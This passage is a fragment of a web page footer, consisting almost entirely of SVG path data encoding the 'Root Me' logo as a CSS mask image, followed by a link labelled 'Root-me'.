5.87-.002-.002c-.002-.002-.004-.003-.008-.003a.0437.0437 0 0 0-.013-.009l-.003-.002a.028.028 0 0 1-.013-.009c-.01 0-.019-.009-.029-.009-.009 0-.019-.01-.019-.01-.009 0-.019 0-.028-.009h-.115c-.009 0-.019 0-.028.009-.01 0-.019.01-.019.01-.01 0-.019.009-.029.009-.009 0-.019.01-.029.02-.009 0-.009.009-.019.009l-.038.038-.772.963c-.095.124-.076.296.048.391.047.038.114.057.171.057.086 0 .162-.038.219-.104l.01-.01c.286-.353.82-.353 1.097 0l.009.01c.057.066.134.104.219.104.058 0 .124-.019.172-.057.124-.095.143-.276.048-.391l-.782-.953c-.01-.01-.019-.019-.019-.029-.01-.009-.01-.009-.019-.019a.0127.0127 0 0 1-.009-.004Zm-1.622-2.265c-.038.076-.095.152-.143.219-.229.267-.572.439-.953.439-.382 0-.725-.172-.954-.439-.191-.219-.295-.505-.295-.81 0-.077.009-.144.019-.22.152.076.314.153.476.229.22.095.449.191.687.267.238.086.486.153.734.219.143.038.286.067.429.096Zm-6.503-2.184c-.114 0-.219-.048-.305-.114-.095-.086-.162-.21-.162-.344 0-.057.01-.114.029-.162.066-.171.238-.295.429-.295.085 0 .162.028.229.067.133.076.228.228.228.4 0 .086-.028.162-.066.229-.067.133-.21.219-.382.219Zm16.21-.181c-.086.105-.219.181-.362.181-.134 0-.248-.057-.334-.143-.076-.086-.124-.191-.124-.315 0-.2.124-.371.305-.429.048-.019.105-.028.162-.028.219 0 .41.162.458.372.009.028.009.057.009.095-.019.095-.057.191-.114.267Zm-5.845-9.869c0 .029.009.048.009.067l-1.163.438V1.897c.286-.047.525-.219.658-.457 1.02.229 1.974.639 2.823 1.201-.01 1.411-.554 2.708-1.412 3.881V5.34c.315-.086.544-.363.544-.706 0-.4-.324-.734-.734-.734-.401.009-.725.334-.725.734Zm-3.48-1.735c-.391 0-.716.305-.735.696l-1.458.534c-.077.028-.134.095-.134.181v.925H7.442c-.086-.315-.362-.544-.705-.544-.401 0-.735.324-.735.735 0 .4.325.734.735.734.343 0 .619-.229.705-.544h1.364c.105 0 .19-.086.19-.19v-.983l1.288-.476c.124.238.372.4.648.4.401 0 .734-.324.734-.734.01-.401-.324-.734-.724-.734Zm-.41-2.241a.4605.4605 0 0 1 .343-.153c.257 0 .467.21.467.468 0 .257-.21.467-.467.467-.096 0-.181-.029-.258-.076-.124-.086-.209-.229-.209-.382 0-.133.047-.248.124-.324Zm2.097.305c0-.257.21-.467.468-.467.133 0 .247.057.333.143.077.086.124.191.124.315 0 .152-.076.295-.2.381-.076.057-.162.086-.267.086-.248.009-.458-.2-.458-.458Z'/%3E%3C/svg%3E&#34);mask-image:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ERoot Me%3C/title%3E%3Cpath d='M21.364 9.897c0-.448-.029-.896-.096-1.325 0-.028-.009-.057-.009-.086-.582-3.785-3.452-6.894-7.228-7.723-.095-.429-.477-.753-.934-.753-.534 0-.964.429-.964.963 0 .457.325.839.754.934v3.519c0 .057.028.114.076.152.029.019.067.029.105.029.019 0 .048 0 .067-.01l1.411-.534c.095.143.238.239.41.286v1.659c-.715.878-1.602 1.669-2.546 2.375l-1.077-2.499c.2-.133.333-.352.333-.61 0-.4-.324-.734-.734-.734-.4 0-.734.324-.734.734 0 .401.324.734.734.734h.038l1.125 2.603c-.658.477-1.335.906-2.002 1.297l-3.204-.963c-.038-.009-.076-.009-.114.01l-.954.372c-.133-.182-.343-.296-.591-.296-.4 0-.734.324-.734.734 0 .401.324.734.734.734.401 0 .734-.324.734-.734 0-.028-.009-.057-.009-.086l.896-.352 2.794.839c-2.384 1.335-4.52 2.107-4.873 2.231l-.171.057a.9205.9205 0 0 0-.553-.181h-.029c-.448-1.058-.677-2.212-.677-3.366 0-.572.057-1.135.162-1.678H7.69c.086.315.362.543.706.543.4 0 .734-.324.734-.734 0-.4-.324-.734-.734-.734-.344 0-.62.229-.706.543h-4.1c.772-3.137 3.251-5.644 6.455-6.388.172.276.477.467.82.467.534 0 .963-.429.963-.963S11.399 0 10.865 0c-.467 0-.848.334-.944.763-4.205.953-7.285 4.739-7.285 9.125 0 1.249.248 2.498.735 3.642-.181.172-.286.42-.286.687 0 .429.276.782.658.915v3.757c0 .067.019.134.057.191l.21.143 2.851 2.012v2.403c0 .2.162.362.362.362h9.535c.2 0 .362-.162.362-.362v-2.403l2.861-2.012.21-.153a.3437.3437 0 0 0 .057-.19v-3.786c.353-.143.601-.486.601-.887 0-.248-.096-.476-.248-.648.505-1.135.763-2.393.763-3.662Zm-1.383 3.366h-.086c-.534 0-.963.429-.963.963 0 .41.258.763.629.897v3.509l-3.003 2.117c-.096.066-.153.181-.153.295v2.022c0 .114-.095.209-.21.209H15.08c-.115 0-.21-.095-.21-.209v-.725c0-.191-.133-.362-.324-.382-.219-.019-.401.153-.401.363v.753c0 .115-.095.21-.209.21h-1.364a.212.212 0 0 1-.21-.21v-1.116c0-.19-.133-.362-.324-.381-.219-.019-.4.153-.4.362v1.145c0 .114-.096.209-.21.209h-1.364a.2109.2109 0 0 1-.209-.209v-.744c0-.191-.134-.362-.325-.382-.219-.019-.4.153-.4.363v.753c0 .115-.095.21-.21.21H7.805c-.115 0-.21-.095-.21-.21v-2.021c0-.115-.057-.229-.153-.296l-2.994-2.117v-3.547a.9594.9594 0 0 0 .563-.877c0-.057-.01-.114-.019-.172.381-.133 3.289-1.173 6.15-2.956 3.871-2.412 6.017-5.149 6.264-7.961 1.669 1.344 2.823 3.289 3.157 5.473-.048 4.777-8.372 7.723-8.458 7.752-.019.009-.067.019-.105.038-.105-.019-.21-.038-.324-.057-.076-.019-.162-.029-.239-.048-.124-.019-.247-.048-.371-.076-.02-.01-.048-.01-.067-.01-.048-.009-.096-.019-.143-.028-.057-.01-.115-.029-.172-.039-.133-.028-.267-.057-.391-.095-.238-.057-.467-.124-.696-.181-.219-.067-.448-.124-.658-.191H8.92c-.162-.047-.315-.095-.467-.152a.9996.9996 0 0 0-.153-.048c-.076-.029-.143-.048-.209-.067-.124-.038-.239-.076-.344-.124h-.009a5.9785 5.9785 0 0 1-.458-.171c-.143-.058-.267-.105-.362-.143-.096-.048-.181-.077-.229-.105-.057-.029-.086-.038-.086-.038s.019.028.057.066c.038.048.096.115.181.191.077.076.182.172.306.267.124.095.267.2.419.305h.01c-.058.191-.096.401-.096.61 0 1.097.897 1.993 1.993 1.993.849 0 1.573-.534 1.86-1.287.095.01.2.019.295.029.172.009.334.009.486.009.01 0 .019.01.029.01l1.611 1.64c.41.41 1.049.477 1.526.162l2.517-1.411c.22-.143.363-.391.363-.658v-2.899c.972-.772 1.85-1.688 2.422-2.727-.105.753-.305 1.468-.601 2.145Zm-7.799 5.87-.002-.002c-.002-.002-.004-.003-.008-.003a.0437.0437 0 0 0-.013-.009l-.003-.002a.028.028 0 0 1-.013-.009c-.01 0-.019-.009-.029-.009-.009 0-.019-.01-.019-.01-.009 0-.019 0-.028-.009h-.115c-.009 0-.019 0-.028.009-.01 0-.019.01-.019.01-.01 0-.019.009-.029.009-.009 0-.019.01-.029.02-.009 0-.009.009-.019.009l-.038.038-.772.963c-.095.124-.076.296.048.391.047.038.114.057.171.057.086 0 .162-.038.219-.104l.01-.01c.286-.353.82-.353 1.097 0l.009.01c.057.066.134.104.219.104.058 0 .124-.019.172-.057.124-.095.143-.276.048-.391l-.782-.953c-.01-.01-.019-.019-.019-.029-.01-.009-.01-.009-.019-.019a.0127.0127 0 0 1-.009-.004Zm-1.622-2.265c-.038.076-.095.152-.143.219-.229.267-.572.439-.953.439-.382 0-.725-.172-.954-.439-.191-.219-.295-.505-.295-.81 0-.077.009-.144.019-.22.152.076.314.153.476.229.22.095.449.191.687.267.238.086.486.153.734.219.143.038.286.067.429.096Zm-6.503-2.184c-.114 0-.219-.048-.305-.114-.095-.086-.162-.21-.162-.344 0-.057.01-.114.029-.162.066-.171.238-.295.429-.295.085 0 .162.028.229.067.133.076.228.228.228.4 0 .086-.028.162-.066.229-.067.133-.21.219-.382.219Zm16.21-.181c-.086.105-.219.181-.362.181-.134 0-.248-.057-.334-.143-.076-.086-.124-.191-.124-.315 0-.2.124-.371.305-.429.048-.019.105-.028.162-.028.219 0 .41.162.458.372.009.028.009.057.009.095-.019.095-.057.191-.114.267Zm-5.845-9.869c0 .029.009.048.009.067l-1.163.438V1.897c.286-.047.525-.219.658-.457 1.02.229 1.974.639 2.823 1.201-.01 1.411-.554 2.708-1.412 3.881V5.34c.315-.086.544-.363.544-.706 0-.4-.324-.734-.734-.734-.401.009-.725.334-.725.734Zm-3.48-1.735c-.391 0-.716.305-.735.696l-1.458.534c-.077.028-.134.095-.134.181v.925H7.442c-.086-.315-.362-.544-.705-.544-.401 0-.735.324-.735.735 0 .4.325.734.735.734.343 0 .619-.229.705-.544h1.364c.105 0 .19-.086.19-.19v-.983l1.288-.476c.124.238.372.4.648.4.401 0 .734-.324.734-.734.01-.401-.324-.734-.724-.734Zm-.41-2.241a.4605.4605 0 0 1 .343-.153c.257 0 .467.21.467.468 0 .257-.21.467-.467.467-.096 0-.181-.029-.258-.076-.124-.086-.209-.229-.209-.382 0-.133.047-.248.124-.324Zm2.097.305c0-.257.21-.467.468-.467.133 0 .247.057.333.143.077.086.124.191.124.315 0 .152-.076.295-.2.381-.076.057-.162.086-.267.086-.248.009-.458-.2-.458-.458Z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Root-me</span> </a></ul></footer>